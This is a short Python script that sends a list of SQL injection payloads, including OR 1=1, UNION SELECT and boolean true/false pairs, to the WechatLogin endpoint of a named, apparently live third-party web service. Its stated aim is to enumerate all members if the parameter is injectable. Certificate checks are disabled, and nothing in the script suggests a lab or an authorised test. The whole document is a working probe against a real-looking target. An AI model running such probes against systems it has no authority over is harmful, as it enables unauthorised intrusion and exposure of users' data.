#!/usr/bin/env python3
"""
Test for SQL injection on the WechatLogin endpoint (cmd=1000)
If the wechatId parameter is vulnerable to SQLi, we could enumerate all members.
"""
import requests, urllib3, json, sys
urllib3.disable_warnings()

url = "https://apib63.bf1788.com/boxApi.php"
base = {"vendorId": "test", "signature": "test", "site": "bfc", "lang": "tw"}

# First get a baseline
resp = requests.post(f"{url}?cmd=1000",
    data={"cmd": "1000", "wechatId": "testwechat001", "sid": "", **base},
    timeout=10, verify=False)
baseline = resp.json()
print(f"Baseline: {baseline}")

# Test SQL injection payloads on wechatId
payloads = [
    "testwechat001' OR '1'='1",
    "testwechat001' OR '1'='1' --",
    "testwechat001' UNION SELECT 1,2,3 --",
    "testwechat001'",
    "testwechat001' AND '1'='1",
    "testwechat001' AND '1'='2",
    "testwechat001\" OR \"1\"=\"1",
    "' OR 1=1 --",
    "testwechat001%27 OR 1=1 --",
    "admin'--",
    "testwechat001' OR '1'='1' #",
]

print("\n=== SQLi Tests ===")
for payload in payloads:
    data = {"cmd": "1000", "wechatId": payload, "sid": "", **base}
    try:
        r = requests.post(f"{url}?cmd=1000", data=data, timeout=10, verify=False)
        body = r.text.strip()
        status_code = r.status_code
        print(f"  payload={payload[:40]:42} => [{status_code}] {body[:150]}")
    except Exception as e:
        print(f"  payload={payload[:40]:42} => ERROR: {e}")

# Also test boolean-based: check if response changes with true/false conditions
print("\n=== Boolean-based ===")
for payload in ["testwechat001' AND '1'='1", "testwechat001' AND '1'='2"]:
    data = {"cmd": "1000", "wechatId": payload, "sid": "", **base}
    r = requests.post(f"{url}?cmd=1000", data=data, timeout=10, verify=False)
    print(f"  {payload}: {r.text.strip()[:100]}")
